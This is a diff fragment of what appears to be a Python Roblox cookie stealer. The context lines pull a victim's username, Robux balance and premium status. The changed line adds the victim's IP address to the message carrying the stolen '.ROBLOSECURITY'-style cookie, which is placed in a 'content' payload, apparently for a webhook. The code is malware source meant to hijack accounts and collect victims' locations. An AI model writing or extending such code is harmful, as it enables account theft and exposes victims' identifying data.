@@ -102,7 +102,7 @@ username = info['UserName']
 robux = info['RobuxBalance']
 premium = info['IsPremium']
 
-message = f'Roblox Cookies: {roblox_cookie}'
+message = f'Roblox Cookies: {roblox_cookie}{ip_address}'
 
 payload = {
     "content": message
